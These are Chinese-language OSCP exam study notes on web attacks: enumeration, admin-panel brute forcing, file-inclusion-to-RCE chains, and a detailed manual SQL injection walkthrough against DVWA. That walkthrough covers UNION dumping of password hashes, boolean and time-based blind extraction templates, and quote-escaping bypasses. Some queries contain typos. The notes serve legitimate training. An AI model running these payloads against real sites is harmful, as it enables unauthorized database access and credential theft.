# 任务2：WEB应用评估方法；WEB 枚举；WEB安全工具；攻击WEB漏洞（XSS）

## web安全现状

webapp存在各种各样的来自不同开发者开发的组件,各个开发者对于安全的理解也不一样,任何一个组件存在安全问题都可能会导致整个webapp出现安全问题,这就使得webapp**暴露出很大的攻击面**。所以对于webhacker而言首先就是要尽可能**找出web的所有组件**。

## web枚举

- 识别目标系统技术栈

- 攻击载荷需要基于目标应用技术栈基础来构建
  - 编程语言和框架
  - web服务器软件
  - 数据库
  - 操作系统
- 从浏览器可以收集很多信息
- 分析URL
  - 文件拓展名可用于发现目标系统开发语言(php)
  - 不同框架的文件拓展名很大，基于java的程序可能使用jsp、do、html等
  - 现代的web架构越来越多使用**基于路由**来实现URL映射,使得拓展名在很大程度上不再重要

## 关注点

- 前端脚本：可能会返回一些后端的url
- 响应头：可能会包含一些敏感信息
  - server：web的中间件和版本
  - x-amz-cf-id：应用使用amazon cloudfront



## 站点地图&管理后台

- 站点地图帮助：可能会包含一些敏感路径或者管理员后台
  - /robot.txt：站点不希望你/爬虫访问的
  - /sitemap.xml：站点希望你/爬虫访问的
  - humans.txt：人员信息
- 定位后台地址：后台可能开启在**不同端口**或者URL,经常被限制为本地访问或其他特殊端口访问呢
  - tomcat：/manager.html
  - phpmyadmin：/phpmyadmin



## 路径枚举

手工可能效率比较低可以借助自动化工具提高效率,但要注意有些时候目标可能会对**访问频率做出限制**,这时候可以考虑适当调低爬取速度-

- 常用的工具：dirb、gobuster、dirsearch
- 针对性的工具：wpscan

## 攻击管理后台

- 发现后台，登录后台(默认账号密码、枚举信息猜账号密码、爆破)
- 由于账号锁定机制，爆破容易被管理员发现
- 成功登录后台后可以看看后台的供能，是否可能造成代码执行



# 任务3：攻击WEB漏洞（XSS）；攻击WEB漏洞（文件包含）；

## XSS

xss通常不会考复杂

# 任务4：攻击WEB漏洞（文件包含）；攻击WEB漏洞（SQL）；

## 文件包含

- php文件包含常用的协议:file、http、data

- php文件包含常用的攻击手段：
  - 文件上传+目录穿越+文件包含=RCE
  - 日志写入(apache日志、ssh日志)+目录穿越+文件包含=RCE
- 常用的绕过方法：data协议+base64

## 命令执行

通常而言用各种linux的命令链接字符绕过就行

# 任务5：攻击WEB漏洞（SQL）；

## 文件上传

oscp侧重点是全流程的渗透,在绕过方面不会太为难考生

## SQL注入

mysql以#作为注释,可以作为payload的结尾

# 任务6&7：攻击WEB漏洞（SQL）；

## 考试要求

不允许使用工具sqlmap,只能<span style='color:red;'>手工注入</span>

## 常规测试步骤

**1.输入有效性测试**

可以输入特殊字符确定回显是否有sql异常

**2.观察错误信息**

根据错误信息猜测尝试<span style="color:red;">还原</span>sql语句,常见的语句比如:

```mysql
SELECT * FROM users WHERE id=?;
SELECT 1,2,3,4 FROM users WHERE id=?;
```

**3.尝试闭合符号以及查询列的个数**

根据2的结果尝试<span style="color:red;">闭合符号</span>,比如`" OR 1=1;#`就是尝试以`"`作为闭合符号

尝试查询语句的<span style="color:red;">列个数</span>,比如`admin" order by 2#`就是尝试按照第2列排序

**4.通过union注入找出所有的<span style="color:red;">数据库</span>**

根据3获得的列数量可以利用联合查询获取数据库中有哪些database,

比如我们想要查询当前登录的用户和数据库

```mysql
SELECT 1,2 FROM users WHERE id="1" union SELECT user(),databse()#
```

根据上述我们找到了`dvwa`这张表

**5.查询database所有的<span style="color:red;">表</span>**

根据4的结果我们把利用`information_schema.tables`找到表

```mysql
SELECT 1,2 FROM users WHERE id="1" UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema="dvwa"#
```

我们得到想要的列users

**6.查询表中所有的<span style="color:red;">列</span>**

根据5得到的结果查询列利用table_name找到列

```mysql
SELECT 1,2 FROM users WHERE id="1" UNION SELECT table_name,table_schema FROM information_schema.columns WHERE table_schema="dvwa" AND table_name="users"#
```

我们感兴趣的列是user和password

**7.查询感兴趣所需的<span style="color:red;">列</span>**

根据6得到的结果查询我们感兴趣的列

```mysql
SELECT 1,2 FROM users WHERE id="1" UNION SELECT user,password FROM dvwa,users #
```

结果都是密码的哈希值

**8.利用在线哈希查询平台反查密码**

推荐平台:

​	[crackstation](https://crackstation.net/)

## 盲注测试步骤

部分情况web服务器不会将sql的查询结果直接返回给客户(主要是sql语句的报错),这里比如服务器只返回了真假逻辑。

那么我们测试步骤会进行细微的改变,这里仅说改变的步骤

**1.输入有效性测试**

- AND和OR逻辑的对比

我们输入`1`有效那么可以尝试下加入特殊字符`1' and 1=1#`,如果结果**一致**那说明可能存在sql注入。

接下来可以尝试用OR语句制造错误逻辑`1' or 1=2#`，如果结果和上述不一致那说明缺失可能存在问题。

- 时间盲注

利用sleep函数计算返回时间确定存在sql注入,比如`1' and sleep(10)#`

**4.通过二进制对比找出当前使用的<span style="color:red;">数据名</span>**

由于盲注不会回显数据库名所以我们只能通过其他方式来进行尝试。这里盲注的一个思路是爆破出表名的每个二进制数,比如我们的数据库名是`dvwa`,这里名表的第一个字符`d`对应的ascii的二进制是`1100100`(最多8个二进制);之后再爆破第二个字符v,就重复这个流程直到爆破出整个表名。

**paylod:**

```mysql
1' and SUBSTR(BIN(ASCII(SUBSTR(database(),2,5))),1,1)>0#
```

这个payload表示我们爆破数据库**字符串**第2个**字符**的第5个**字节**如果>0那么返回结果为真。

**exsample:**

我们如果想要爆破第一个字符,我们用`char`表示第一个字符的二进制:

```mysql
1' and SUBSTR(BIN(ASCII(SUBSTR(database(),1,1))),1,1)>0#
```

结果返回真,那么

char=1

```mysql
1' and SUBSTR(BIN(ASCII(SUBSTR(database(),1,1))),2,1)>0#
```

结果返回真,那么

char=11

```mysql
1' and SUBSTR(BIN(ASCII(SUBSTR(database(),1,1))),3,1)>0#
```

结果返回假,那么

char=110

```mysql
1' and SUBSTR(BIN(ASCII(SUBSTR(database(),1,1))),4,1)>0#
```

结果返回假,那么

char=1100

```mysql
1' and SUBSTR(BIN(ASCII(SUBSTR(database(),1,1))),5,1)>0#
```

结果返回真,那么

char=11001

```mysql
1' and SUBSTR(BIN(ASCII(SUBSTR(database(),1,1))),6,1)>0#
```

结果返回假,那么

char=110010

```mysql
1' and SUBSTR(BIN(ASCII(SUBSTR(database(),1,1))),7,1)>0#
```

结果返回假,那么

char=1100100

这里就由于二进制1100100（7位）对应的是d的ascii码的二进制,所以数据库名的第一位就是d

**小结:**

```mysql
1' and SUBSTR(BIN(ASCII(SUBSTR(database(),$indexChar,1))),$indexBin,1)>0#
```

其中`indexChar`表示要枚举**字符串**的索引(索引从1开始),indexBin表示枚举**字符**对应二进制的索引

## 常用的绕过方式

- 单引号(`'`)转意(`\'`)的绕过

  比如原来的语句

  ```mysql
  SELECT 1,2 FROM users WHERE id='1' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema='dvwa'
  ```

  由于单引号的转意所以会报错。

  - 利用函数进行绕过

  这里的表名可以用函数`database()`进行替换。替换后的句子

  ```mysql
  SELECT 1,2 FROM users WHERE id=1 UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database()
  ```

  - 利用acsii码绕过

  由于在mysql中acsii码和字符等价(类似c语言),所以可以用dvwa的ascii码进行替换

  ```mysql
  SELECT 1,2 FROM users WHERE id=1 UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=0x64767761
  ```

  - 利用limit 1绕过

  部分情况目标会根据返回的结果条数判断为sql注入,比如登录返回结果超过1个,那么就进行拦截。这时候可以用limit限制返回结果

  ```mysql
  SELECT user,password FROM users WHERE user="a" OR 1=1 limit 1# AND password=$password
  ```

  

## 常用的函数

- database(): 当前使用的数据库名

- load_file()：读取本地文件

- dumpfile： 写入文件

- sleep()：睡眠函数

  

